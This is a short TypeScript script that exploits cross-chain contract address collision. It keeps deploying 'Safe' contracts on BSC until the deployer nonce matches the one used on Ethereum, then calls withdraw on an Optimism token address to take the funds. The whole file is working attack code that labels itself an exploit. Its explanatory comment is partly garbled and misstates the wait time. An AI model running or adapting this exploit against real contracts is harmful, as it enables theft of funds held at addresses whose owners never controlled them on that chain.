import { checkNonce, deploySafe } from "./web3"
import address from "./utils/address.json"
import { Contract } from "ethers"
import safe from '../artifacts/contracts/Safe.sol/Safe.json'
import { bscAccount, wait } from "./utils"

// The nonce of the safe deployer at the time the safe was deployed on eth
const ethSafeDeployerNonce = 8

const main = async () => {

    /*
     Check that the nonce of the deployer address on the bsc chain is equal to the nonce of the 
     deployer address on the eth chain. If so stop further safe deployments
     This means that on the resulting safe address on the bsc chain will be the same as 
     the safe address on the eth chain  next transaction the nonce of the safe deployer on the other
    */

    while (true) {
        const deployedSafe = await deploySafe("Safe")

        // wait for some minutes before checking nonce
        await wait(10000)

        const attack = await checkNonce(address.bscSafeDeployer, ethSafeDeployerNonce)

        if (attack) {
            const exploitSafe = new Contract(deployedSafe!, safe.abi, bscAccount)

            const tx = exploitSafe.withdraw(address.optimismToken)

            console.log("Exploit complete ", tx)
            break;
        }
    }
}

main()
